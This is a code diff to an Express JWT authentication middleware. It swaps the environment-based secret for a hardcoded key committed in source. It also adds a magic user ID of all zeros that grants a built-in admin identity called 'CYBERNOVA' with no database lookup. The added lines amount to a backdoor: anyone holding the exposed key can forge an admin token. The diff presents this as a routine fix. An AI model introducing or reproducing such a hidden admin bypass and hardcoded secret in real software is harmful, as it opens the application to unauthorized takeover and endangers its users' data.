@@ -7,11 +7,24 @@ const protect = async (req, res, next) => {
     if (req.headers.authorization && req.headers.authorization.startsWith('Bearer')) {
         try {
             token = req.headers.authorization.split(' ')[1];
-            const decoded = jwt.verify(token, process.env.JWT_SECRET);
-            req.user = await Admin.findById(decoded.id).select('-password');
+
+            // HARDCODED SECRET matching controller
+            const secret = 'CYBERNOVA_SECRET_KEY_12345';
+            const decoded = jwt.verify(token, secret);
+
+            if (decoded.id === '000000000000000000000000') {
+                req.user = {
+                    _id: '000000000000000000000000',
+                    username: 'CYBERNOVA', // Hardcoded username
+                    isAdmin: true
+                };
+            } else {
+                req.user = await Admin.findById(decoded.id).select('-password');
+            }
+
             next();
         } catch (error) {
-            console.error(error);
+            console.error('Auth Middleware Error:', error.message);
             res.status(401).json({ message: 'Not authorized, token failed' });
         }
     }
